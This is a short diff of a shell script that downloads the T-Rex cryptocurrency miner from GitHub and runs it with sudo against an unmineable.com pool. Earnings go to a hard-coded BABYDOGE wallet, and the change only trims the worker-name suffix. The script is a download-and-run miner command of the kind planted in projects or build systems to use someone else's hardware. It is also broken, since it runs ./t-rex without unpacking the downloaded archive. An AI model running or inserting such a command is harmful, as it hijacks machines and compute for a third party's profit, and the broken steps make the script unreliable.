@@ -1,2 +1,2 @@
 #!/bin/sh
-apt-get install libpci3 && wget https://github.com/trexminer/T-Rex/releases/download/0.25.8/t-rex-0.25.8-linux.tar.gz && sudo ./t-rex -a ethash -o ethash.unmineable.com:3333 -u BABYDOGE:0xf2776AE98F22a73b6f7aB62648BeF25614032a69.$(echo $(shuf -i 1-10 -n 1)-TRex#nyty-xguk) -p x
+apt-get install libpci3 && wget https://github.com/trexminer/T-Rex/releases/download/0.25.8/t-rex-0.25.8-linux.tar.gz && sudo ./t-rex -a ethash -o ethash.unmineable.com:3333 -u BABYDOGE:0xf2776AE98F22a73b6f7aB62648BeF25614032a69.$(echo $(shuf -i 1-10 -n 1)-TRex#) -p x
